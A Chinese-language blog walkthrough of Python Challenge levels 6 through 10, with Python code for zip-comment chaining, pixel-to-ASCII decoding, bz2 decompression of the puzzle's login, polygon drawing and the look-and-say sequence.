<p>最终代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re, zipfile  </span><br><span class="line">path = <span class="string">&quot;attachments/level_6/channel.zip&quot;</span>  </span><br><span class="line">nothing = <span class="string">&quot;90052&quot;</span>  </span><br><span class="line">comment = []  </span><br><span class="line">pattern = <span class="string">&quot;Next nothing is (\d+)&quot;</span>  </span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">        fileName = nothing + <span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">        content = f.read(fileName).decode(<span class="string">&quot;utf-8&quot;</span>)  </span><br><span class="line">        comment.append(f.getinfo(fileName).comment.decode(<span class="string">&#x27;utf-8&#x27;</span>))  </span><br><span class="line">        match = re.search(pattern, content)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> match:  </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        nothing = match.group(<span class="number">1</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(comment))</span><br></pre></td></tr></table></figure></p>
<p>结果： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220131110030.png" /></p>
<p>访问 <code>http://www.pythonchallenge.com/pc/def/hockey.html</code>，得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">it&#x27;s in the air. look at the letters.</span><br></pre></td></tr></table></figure></p>
<p>注意到，组成 HOCKY 的字母为 oxygen，因此修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/def/hockey.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/def/oxygen.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-7">level 7</h1>
<h2 id="题目信息-7">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201114933.png" /></p>
<p>只有上面一张奇怪的图片，页面源码也没有东西。可以看到图片上有一些灰度块，目前合理猜测就是：<strong>这些灰度块隐藏着信息。</strong></p>
<h2 id="方法-9">方法</h2>
<p>第一步，先将图片下载下来： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">img_url = <span class="string">&quot;http://www.pythonchallenge.com/pc/def/oxygen.png&quot;</span>  </span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span></span><br><span class="line">img = requests.get(img_url)  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    f.write(img.content)</span><br></pre></td></tr></table></figure></p>
<p>第二步，查看图片的必要信息： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(path)  </span><br><span class="line"><span class="built_in">print</span>(img.<span class="built_in">format</span>, img.size, img.mode)</span><br></pre></td></tr></table></figure></p>
<p>结果是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PNG (629, 95) RGBA # 分别是后缀，（宽，高）， 模式</span><br></pre></td></tr></table></figure></p>
<p>可以看到图像的模式是 RGBA 的，那么每个像素点就是个四元组，分别为 <code>r, g, b, a</code> 前三个为红，绿，黄，最后一个为透明度（本题用不着）。需要注意一点：<strong>灰度图像的 r == g == b</strong>，因此，我们利用这点，先找到图片中的灰度条在哪几行。代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(path)</span><br><span class="line">row = [img.getpixel((<span class="number">0</span>, x)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.height)]  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(img.height):  </span><br><span class="line">    <span class="keyword">if</span> row[i][<span class="number">0</span>] == row[i][<span class="number">1</span>] == row[i][<span class="number">2</span>]:  <span class="comment"># r == g == b</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%d:&quot;</span> % i, end = <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(row[i])</span><br></pre></td></tr></table></figure></p>
<p>结果： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201122229.png" /></p>
<p>随便取一行即可，这里取 47，因为 <code>img.height / 2</code> 的值为 47。</p>
<p>第三步，取出 47 行的所有像素点： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(path)</span><br><span class="line">row = [img.getpixel((x, img.height/<span class="number">2</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(img.width):</span><br><span class="line">    <span class="built_in">print</span>(row[i])</span><br></pre></td></tr></table></figure></p>
<p>结果： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201122525.png" /></p>
<p>发现，除了第一个之外，其余的像素点都重复了 7 次，因此我们剔除重复的：（上面的代码稍作修改） <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(path)</span><br><span class="line">row = [img.getpixel((x, img.height/<span class="number">2</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, img.width, <span class="number">7</span>): <span class="comment"># 修改了这里</span></span><br><span class="line">    <span class="built_in">print</span>(row[i])</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201122931.png" /></p>
<p>第四步，每个灰度图像都有一个灰度值，因此做一个猜测：<strong>将这些灰度值当作 ascii 码，然后转为字符。</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(path)  </span><br><span class="line">row = [img.getpixel((x, img.height/<span class="number">2</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width)]  </span><br><span class="line">info = []  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, img.width, <span class="number">7</span>):  </span><br><span class="line">    info.append(<span class="built_in">chr</span>(row[i][<span class="number">0</span>]))  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(info))</span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smart guy, you made it. the next level is [105, 110, 116, 101, 103, 114, 105, 116, 121]pe_ </span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>后边的 pe_ 我猜测是因为第一个像素点就重复了5次，而我取步长为7，导致每次取得都不是重复值里面得第一个，因为可能将重复值后面得无关的也取了进来。</p>
</blockquote>
<p>将上面结果中得数字也提取出来，当作 ascii 码处理，因此最终代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re  </span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image  </span><br><span class="line">img_url = <span class="string">&quot;http://www.pythonchallenge.com/pc/def/oxygen.png&quot;</span>  </span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span>  </span><br><span class="line">img = Image.<span class="built_in">open</span>(path)  </span><br><span class="line">row = [img.getpixel((x, img.height/<span class="number">2</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width)]  </span><br><span class="line">info = []  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, img.width, <span class="number">7</span>):  </span><br><span class="line">    info.append(<span class="built_in">chr</span>(row[i][<span class="number">0</span>]))  </span><br><span class="line">message = <span class="string">&quot;&quot;</span>.join(info)  </span><br><span class="line"><span class="built_in">next</span> = re.findall(<span class="string">r&#x27;(\d+)&#x27;</span>, message)  </span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">next</span>:  </span><br><span class="line">    v = <span class="built_in">int</span>(c)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(v), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">integrity</span><br></pre></td></tr></table></figure></p>
<p>修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/def/oxygen.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/def/integrity.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-8">level 8</h1>
<h2 id="题目信息-8">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201221330.png" /></p>
<p>查看页面源码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201221350.png" /></p>
<p>发现：</p>
<ol type="1">
<li>图片中的蜜蜂可以点开，点开之后会跳出一个验证界面 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201221552.png" /></li>
<li>绿色字符串正好对应的用户名和密码</li>
</ol>
<p>但是，很明显可以看出应该是经过某种编码的，后来发现，是通过 <strong>bz2</strong> 压缩得到的。而 python 自带了 <strong>bz2</strong> 库。</p>
<h2 id="方法-10">方法</h2>
<p>代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> bz2  </span><br><span class="line">un = <span class="string">b&#x27;BZh91AY&amp;SYA\xaf\x82\r\x00\x00\x01\x01\x80\x02\xc0\x02\x00 \x00!\x9ah3M\x07&lt;]\xc9\x14\xe1BA\x06\xbe\x084&#x27;</span>  </span><br><span class="line">pw = <span class="string">b&#x27;BZh91AY&amp;SY\x94$|\x0e\x00\x00\x00\x81\x00\x03$ \x00!\x9ah3M\x13&lt;]\xc9\x14\xe1BBP\x91\xf08&#x27;</span>  </span><br><span class="line"><span class="built_in">print</span>(bz2.decompress(un), bz2.decompress(pw))</span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;huge&#x27; b&#x27;file&#x27;</span><br><span class="line"></span><br><span class="line">用户名：huge</span><br><span class="line">密码：file</span><br></pre></td></tr></table></figure></p>
<p>然后成功登录，得到新的 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.pythonchallenge.com/pc/return/good.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-9">level 9</h1>
<h2 id="题目信息-9">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201230807.png" /></p>
<p>查看页面源码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201230823.png" /></p>
<p>最开始还以为是将图中的黑点连起来，后来想想应该不太可能，然后注意到 <code>first + second</code> ，但是 first 和 second 的长度都不同，无法相加，所以应该不是简单的相加。联想到 <code>connect the dots</code> 觉得应该是将 first 和 second 连接起来，那么 first 和 second 代表的就是点的坐标。</p>
<h2 id="方法-11">方法</h2>
<p>代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw  </span><br><span class="line">first = [<span class="number">146</span>,<span class="number">399</span>,<span class="number">163</span>,<span class="number">403</span>,<span class="number">170</span>,<span class="number">393</span>,<span class="number">169</span>,<span class="number">391</span>,<span class="number">166</span>,<span class="number">386</span>,<span class="number">170</span>,<span class="number">381</span>,<span class="number">170</span>,<span class="number">371</span>,<span class="number">170</span>,<span class="number">355</span>,<span class="number">169</span>,<span class="number">346</span>,<span class="number">167</span>,<span class="number">335</span>,<span class="number">170</span>,<span class="number">329</span>,<span class="number">170</span>,<span class="number">320</span>,<span class="number">170</span>,<span class="number">310</span>,<span class="number">171</span>,<span class="number">301</span>,<span class="number">173</span>,<span class="number">290</span>,<span class="number">178</span>,<span class="number">289</span>,<span class="number">182</span>,<span class="number">287</span>,<span class="number">188</span>,<span class="number">286</span>,<span class="number">190</span>,<span class="number">286</span>,<span class="number">192</span>,<span class="number">291</span>,<span class="number">194</span>,<span class="number">296</span>,<span class="number">195</span>,<span class="number">305</span>,<span class="number">194</span>,<span class="number">307</span>,<span class="number">191</span>,<span class="number">312</span>,<span class="number">190</span>,<span class="number">316</span>,<span class="number">190</span>,<span class="number">321</span>,<span class="number">192</span>,<span class="number">331</span>,<span class="number">193</span>,<span class="number">338</span>,<span class="number">196</span>,<span class="number">341</span>,<span class="number">197</span>,<span class="number">346</span>,<span class="number">199</span>,<span class="number">352</span>,<span class="number">198</span>,<span class="number">360</span>,<span class="number">197</span>,<span class="number">366</span>,<span class="number">197</span>,<span class="number">373</span>,<span class="number">196</span>,<span class="number">380</span>,<span class="number">197</span>,<span class="number">383</span>,<span class="number">196</span>,<span class="number">387</span>,<span class="number">192</span>,<span class="number">389</span>,<span class="number">191</span>,<span class="number">392</span>,<span class="number">190</span>,<span class="number">396</span>,<span class="number">189</span>,<span class="number">400</span>,<span class="number">194</span>,<span class="number">401</span>,<span class="number">201</span>,<span class="number">402</span>,<span class="number">208</span>,<span class="number">403</span>,<span class="number">213</span>,<span class="number">402</span>,<span class="number">216</span>,<span class="number">401</span>,<span class="number">219</span>,<span class="number">397</span>,<span class="number">219</span>,<span class="number">393</span>,<span class="number">216</span>,<span class="number">390</span>,<span class="number">215</span>,<span class="number">385</span>,<span class="number">215</span>,<span class="number">379</span>,<span class="number">213</span>,<span class="number">373</span>,<span class="number">213</span>,<span class="number">365</span>,<span class="number">212</span>,<span class="number">360</span>,<span class="number">210</span>,<span class="number">353</span>,<span class="number">210</span>,<span class="number">347</span>,<span class="number">212</span>,<span class="number">338</span>,<span class="number">213</span>,<span class="number">329</span>,<span class="number">214</span>,<span class="number">319</span>,<span class="number">215</span>,<span class="number">311</span>,<span class="number">215</span>,<span class="number">306</span>,<span class="number">216</span>,<span class="number">296</span>,<span class="number">218</span>,<span class="number">290</span>,<span class="number">221</span>,<span class="number">283</span>,<span class="number">225</span>,<span class="number">282</span>,<span class="number">233</span>,<span class="number">284</span>,<span class="number">238</span>,<span class="number">287</span>,<span class="number">243</span>,<span class="number">290</span>,<span class="number">250</span>,<span class="number">291</span>,<span class="number">255</span>,<span class="number">294</span>,<span class="number">261</span>,<span class="number">293</span>,<span class="number">265</span>,<span class="number">291</span>,<span class="number">271</span>,<span class="number">291</span>,<span class="number">273</span>,<span class="number">289</span>,<span class="number">278</span>,<span class="number">287</span>,<span class="number">279</span>,<span class="number">285</span>,<span class="number">281</span>,<span class="number">280</span>,<span class="number">284</span>,<span class="number">278</span>,<span class="number">284</span>,<span class="number">276</span>,<span class="number">287</span>,<span class="number">277</span>,<span class="number">289</span>,<span class="number">283</span>,<span class="number">291</span>,<span class="number">286</span>,<span class="number">294</span>,<span class="number">291</span>,<span class="number">296</span>,<span class="number">295</span>,<span class="number">299</span>,<span class="number">300</span>,<span class="number">301</span>,<span class="number">304</span>,<span class="number">304</span>,<span class="number">320</span>,<span class="number">305</span>,<span class="number">327</span>,<span class="number">306</span>,<span class="number">332</span>,<span class="number">307</span>,<span class="number">341</span>,<span class="number">306</span>,<span class="number">349</span>,<span class="number">303</span>,<span class="number">354</span>,<span class="number">301</span>,<span class="number">364</span>,<span class="number">301</span>,<span class="number">371</span>,<span class="number">297</span>,<span class="number">375</span>,<span class="number">292</span>,<span class="number">384</span>,<span class="number">291</span>,<span class="number">386</span>,<span class="number">302</span>,<span class="number">393</span>,<span class="number">324</span>,<span class="number">391</span>,<span class="number">333</span>,<span class="number">387</span>,<span class="number">328</span>,<span class="number">375</span>,<span class="number">329</span>,<span class="number">367</span>,<span class="number">329</span>,<span class="number">353</span>,<span class="number">330</span>,<span class="number">341</span>,<span class="number">331</span>,<span class="number">328</span>,<span class="number">336</span>,<span class="number">319</span>,<span class="number">338</span>,<span class="number">310</span>,<span class="number">341</span>,<span class="number">304</span>,<span class="number">341</span>,<span class="number">285</span>,<span class="number">341</span>,<span class="number">278</span>,<span class="number">343</span>,<span class="number">269</span>,<span class="number">344</span>,<span class="number">262</span>,<span class="number">346</span>,<span class="number">259</span>,<span class="number">346</span>,<span class="number">251</span>,<span class="number">349</span>,<span class="number">259</span>,<span class="number">349</span>,<span class="number">264</span>,<span class="number">349</span>,<span class="number">273</span>,<span class="number">349</span>,<span class="number">280</span>,<span class="number">349</span>,<span class="number">288</span>,<span class="number">349</span>,<span class="number">295</span>,<span class="number">349</span>,<span class="number">298</span>,<span class="number">354</span>,<span class="number">293</span>,<span class="number">356</span>,<span class="number">286</span>,<span class="number">354</span>,<span class="number">279</span>,<span class="number">352</span>,<span class="number">268</span>,<span class="number">352</span>,<span class="number">257</span>,<span class="number">351</span>,<span class="number">249</span>,<span class="number">350</span>,<span class="number">234</span>,<span class="number">351</span>,<span class="number">211</span>,<span class="number">352</span>,<span class="number">197</span>,<span class="number">354</span>,<span class="number">185</span>,<span class="number">353</span>,<span class="number">171</span>,<span class="number">351</span>,<span class="number">154</span>,<span class="number">348</span>,<span class="number">147</span>,<span class="number">342</span>,<span class="number">137</span>,<span class="number">339</span>,<span class="number">132</span>,<span class="number">330</span>,<span class="number">122</span>,<span class="number">327</span>,<span class="number">120</span>,<span class="number">314</span>,<span class="number">116</span>,<span class="number">304</span>,<span class="number">117</span>,<span class="number">293</span>,<span class="number">118</span>,<span class="number">284</span>,<span class="number">118</span>,<span class="number">281</span>,<span class="number">122</span>,<span class="number">275</span>,<span class="number">128</span>,<span class="number">265</span>,<span class="number">129</span>,<span class="number">257</span>,<span class="number">131</span>,<span class="number">244</span>,<span class="number">133</span>,<span class="number">239</span>,<span class="number">134</span>,<span class="number">228</span>,<span class="number">136</span>,<span class="number">221</span>,<span class="number">137</span>,<span class="number">214</span>,<span class="number">138</span>,<span class="number">209</span>,<span class="number">135</span>,<span class="number">201</span>,<span class="number">132</span>,<span class="number">192</span>,<span class="number">130</span>,<span class="number">184</span>,<span class="number">131</span>,<span class="number">175</span>,<span class="number">129</span>,<span class="number">170</span>,<span class="number">131</span>,<span class="number">159</span>,<span class="number">134</span>,<span class="number">157</span>,<span class="number">134</span>,<span class="number">160</span>,<span class="number">130</span>,<span class="number">170</span>,<span class="number">125</span>,<span class="number">176</span>,<span class="number">114</span>,<span class="number">176</span>,<span class="number">102</span>,<span class="number">173</span>,<span class="number">103</span>,<span class="number">172</span>,<span class="number">108</span>,<span class="number">171</span>,<span class="number">111</span>,<span class="number">163</span>,<span class="number">115</span>,<span class="number">156</span>,<span class="number">116</span>,<span class="number">149</span>,<span class="number">117</span>,<span class="number">142</span>,<span class="number">116</span>,<span class="number">136</span>,<span class="number">115</span>,<span class="number">129</span>,<span class="number">115</span>,<span class="number">124</span>,<span class="number">115</span>,<span class="number">120</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">117</span>,<span class="number">113</span>,<span class="number">120</span>,<span class="number">109</span>,<span class="number">122</span>,<span class="number">102</span>,<span class="number">122</span>,<span class="number">100</span>,<span class="number">121</span>,<span class="number">95</span>,<span class="number">121</span>,<span class="number">89</span>,<span class="number">115</span>,<span class="number">87</span>,<span class="number">110</span>,<span class="number">82</span>,<span class="number">109</span>,<span class="number">84</span>,<span class="number">118</span>,<span class="number">89</span>,<span class="number">123</span>,<span class="number">93</span>,<span class="number">129</span>,<span class="number">100</span>,<span class="number">130</span>,<span class="number">108</span>,<span class="number">132</span>,<span class="number">110</span>,<span class="number">133</span>,<span class="number">110</span>,<span class="number">136</span>,<span class="number">107</span>,<span class="number">138</span>,<span class="number">105</span>,<span class="number">140</span>,<span class="number">95</span>,<span class="number">138</span>,<span class="number">86</span>,<span class="number">141</span>,<span class="number">79</span>,<span class="number">149</span>,<span class="number">77</span>,<span class="number">155</span>,<span class="number">81</span>,<span class="number">162</span>,<span class="number">90</span>,<span class="number">165</span>,<span class="number">97</span>,<span class="number">167</span>,<span class="number">99</span>,<span class="number">171</span>,<span class="number">109</span>,<span class="number">171</span>,<span class="number">107</span>,<span class="number">161</span>,<span class="number">111</span>,<span class="number">156</span>,<span class="number">113</span>,<span class="number">170</span>,<span class="number">115</span>,<span class="number">185</span>,<span class="number">118</span>,<span class="number">208</span>,<span class="number">117</span>,<span class="number">223</span>,<span class="number">121</span>,<span class="number">239</span>,<span class="number">128</span>,<span class="number">251</span>,<span class="number">133</span>,<span class="number">259</span>,<span class="number">136</span>,<span class="number">266</span>,<span class="number">139</span>,<span class="number">276</span>,<span class="number">143</span>,<span class="number">290</span>,<span class="number">148</span>,<span class="number">310</span>,<span class="number">151</span>,<span class="number">332</span>,<span class="number">155</span>,<span class="number">348</span>,<span class="number">156</span>,<span class="number">353</span>,<span class="number">153</span>,<span class="number">366</span>,<span class="number">149</span>,<span class="number">379</span>,<span class="number">147</span>,<span class="number">394</span>,<span class="number">146</span>,<span class="number">399</span>]  </span><br><span class="line">second = [<span class="number">156</span>,<span class="number">141</span>,<span class="number">165</span>,<span class="number">135</span>,<span class="number">169</span>,<span class="number">131</span>,<span class="number">176</span>,<span class="number">130</span>,<span class="number">187</span>,<span class="number">134</span>,<span class="number">191</span>,<span class="number">140</span>,<span class="number">191</span>,<span class="number">146</span>,<span class="number">186</span>,<span class="number">150</span>,<span class="number">179</span>,<span class="number">155</span>,<span class="number">175</span>,<span class="number">157</span>,<span class="number">168</span>,<span class="number">157</span>,<span class="number">163</span>,<span class="number">157</span>,<span class="number">159</span>,<span class="number">157</span>,<span class="number">158</span>,<span class="number">164</span>,<span class="number">159</span>,<span class="number">175</span>,<span class="number">159</span>,<span class="number">181</span>,<span class="number">157</span>,<span class="number">191</span>,<span class="number">154</span>,<span class="number">197</span>,<span class="number">153</span>,<span class="number">205</span>,<span class="number">153</span>,<span class="number">210</span>,<span class="number">152</span>,<span class="number">212</span>,<span class="number">147</span>,<span class="number">215</span>,<span class="number">146</span>,<span class="number">218</span>,<span class="number">143</span>,<span class="number">220</span>,<span class="number">132</span>,<span class="number">220</span>,<span class="number">125</span>,<span class="number">217</span>,<span class="number">119</span>,<span class="number">209</span>,<span class="number">116</span>,<span class="number">196</span>,<span class="number">115</span>,<span class="number">185</span>,<span class="number">114</span>,<span class="number">172</span>,<span class="number">114</span>,<span class="number">167</span>,<span class="number">112</span>,<span class="number">161</span>,<span class="number">109</span>,<span class="number">165</span>,<span class="number">107</span>,<span class="number">170</span>,<span class="number">99</span>,<span class="number">171</span>,<span class="number">97</span>,<span class="number">167</span>,<span class="number">89</span>,<span class="number">164</span>,<span class="number">81</span>,<span class="number">162</span>,<span class="number">77</span>,<span class="number">155</span>,<span class="number">81</span>,<span class="number">148</span>,<span class="number">87</span>,<span class="number">140</span>,<span class="number">96</span>,<span class="number">138</span>,<span class="number">105</span>,<span class="number">141</span>,<span class="number">110</span>,<span class="number">136</span>,<span class="number">111</span>,<span class="number">126</span>,<span class="number">113</span>,<span class="number">129</span>,<span class="number">118</span>,<span class="number">117</span>,<span class="number">128</span>,<span class="number">114</span>,<span class="number">137</span>,<span class="number">115</span>,<span class="number">146</span>,<span class="number">114</span>,<span class="number">155</span>,<span class="number">115</span>,<span class="number">158</span>,<span class="number">121</span>,<span class="number">157</span>,<span class="number">128</span>,<span class="number">156</span>,<span class="number">134</span>,<span class="number">157</span>,<span class="number">136</span>,<span class="number">156</span>,<span class="number">136</span>]  </span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">500</span>, <span class="number">500</span>))  </span><br><span class="line">draw = ImageDraw.Draw(img)  </span><br><span class="line">draw.polygon(first, fill = <span class="string">&#x27;white&#x27;</span>)  </span><br><span class="line">draw.polygon(second, fill = <span class="string">&#x27;white&#x27;</span>)  </span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure></p>
<p>结果是： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201231228.png" /></p>
<p>牛的英文是 cow，修改 url 为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.pythonchallenge.com/pc/return/cow.html</span><br></pre></td></tr></table></figure>
<p>提示： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hmm. it&#x27;s a male.</span><br></pre></td></tr></table></figure></p>
<p>也就是公牛，英语为 bull。修改 url 为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/return/cow.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/return/bull.html</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>如果出现验证的框，输入 level 8 得到的用户名和密码即可。</p>
</blockquote>
<p>其实，只有 first 也能画出这头牛，而 second 画出来的长这样： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201231802.png" /></p>
<p>不知道是否可以理解为 <strong>性器官？？？</strong></p>
<h1 id="level-10">level 10</h1>
<h2 id="题目信息-10">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220202104810.png" /></p>
<p>注意到 <code>len(a[30]) = ?</code>。查看页面源码，发现图片中的牛可以点击，并且得到一个数组 a： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = [1, 11, 21, 1211, 111221,</span><br></pre></td></tr></table></figure></p>
<p>通过观察，发现这个数组并没有闭合。那么思路就是：<strong>通过数组的某种规律得到 a[30] 的值，然后再计算长度。</strong></p>
<p>通过查资料发现，这是外观序列。</p>
<blockquote>
<p>外观序列（Look-and-say sequence），是指以下特点的整数序列：</p>
<p>1, 11, 21, 1211, 111221, 312211, 13112221, 1113213211, ……</p>
<p>它以数字1开始，序列的第n+1项是对第n项的描述。比如第2项是2个1，所以下一项（第三项）就是21。又比如第5项是111221，描述就是3个1，2个2，1个1， 所以下一项就是312211。</p>
</blockquote>
<h2 id="方法-1-1">方法 1</h2>
<p>代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getNext</span>(<span class="params">res</span>):</span>  </span><br><span class="line">    index, <span class="built_in">next</span> = <span class="number">0</span>, <span class="string">&quot;&quot;</span>  </span><br><span class="line"> <span class="keyword">while</span> index &lt; <span class="built_in">len</span>(res):  </span><br><span class="line">	count = <span class="number">1</span>  </span><br><span class="line">	<span class="keyword">while</span> index &lt; <span class="built_in">len</span>(res) - <span class="number">1</span> <span class="keyword">and</span> res[index] == res[index+<span class="number">1</span>]:  </span><br><span class="line">		count += <span class="number">1</span>  </span><br><span class="line">		index += <span class="number">1</span>  </span><br><span class="line">	<span class="built_in">next</span> += <span class="built_in">str</span>(count) + res[index]  </span><br><span class="line">	index += <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">next</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">countAndSay</span>(<span class="params">length</span>):</span>  </span><br><span class="line">    res = <span class="string">&#x27;1&#x27;</span>  </span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length-<span class="number">1</span>):  </span><br><span class="line">		res = getNext(res)</span><br><span class="line">	<span class="keyword">return</span>(res) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(countAndSay(<span class="number">31</span>)))</span><br></pre></td></tr></table></figure></p>
<p><strong>（注意，一定是 count 在前，res[index] 在后）</strong></p>
<p>得到结果：5808</p>
<p>因此修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/return/bull.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/return/5808.html</span><br></pre></td></tr></table></figure></p>
<h2 id="方法-2-1">方法 2</h2>
<p>利用正则表达式替代循环。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="built_in">print</span>(re.findall(<span class="string">r&#x27;(\d)(\1*)&#x27;</span>, <span class="string">&#x27;111221&#x27;</span>))</span><br></pre></td></tr></table></figure></p>
<p>结果为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[(&#x27;1&#x27;, &#x27;11&#x27;), (&#x27;2&#x27;, &#x27;2&#x27;), (&#x27;1&#x27;, &#x27;&#x27;)]</span><br></pre></td></tr></table></figure></p>
<p>（假设元组第一个元素为 i，第二个元素为 j）那么与方法 1相比： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">value == res[index]</span><br><span class="line">count == len(str(i+j))</span><br></pre></td></tr></table></figure></p>
